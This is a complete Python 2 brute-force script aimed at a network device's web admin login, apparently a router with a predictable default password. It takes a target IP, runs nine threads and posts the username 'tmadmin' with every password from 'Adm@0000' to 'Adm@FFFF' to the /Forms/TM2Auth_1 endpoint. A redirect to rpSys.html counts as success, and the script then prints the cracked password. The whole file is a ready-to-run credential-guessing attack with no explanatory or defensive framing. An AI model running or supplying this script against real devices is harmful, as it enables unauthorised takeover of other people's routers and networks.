#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import threading
import Queue
import os
import time
from requests.exceptions import ConnectionError

target = str(raw_input('Target IP: '))
print 'Running...'

class BruteThread(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid

    def run(self):
        while True:
            dapw = self.queue.get(timeout=1)
            try:
                payload = {'LoginNameValue':'tmadmin','LoginPasswordValue':dapw}
                r = requests.post('http://'+target+'/Forms/TM2Auth_1', data=payload, allow_redirects=False, timeout=60)
                location = r.headers['Location']
            except ConnectionError, e:
                print 'Testing ' + dapw + ' Connection Error!'
            if 'rpSys.html' in location:
                print 'Success!! The PW is ' + dapw
                os.kill(os.getpid(), 2)
            else:
                print "\rTesting Password " + dapw + " : Failed"
            self.queue.task_done()

queue = Queue.Queue()
threads = []

for i in range(1,10):
    worker = BruteThread(queue,i)
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)

while True:
    for x in xrange(65536):
        backnum = len(hex(x).split('0x')[1])
        if backnum < 4:
            num = '0' * (4 - backnum) + hex(x).split('0x')[1]
            queue.put('Adm@' + num.upper())
        else:
            num = hex(x).split('0x')[1]
            queue.put('Adm@' + num.upper())

print 'Done!'
os.kill(os.getpid(), 2)
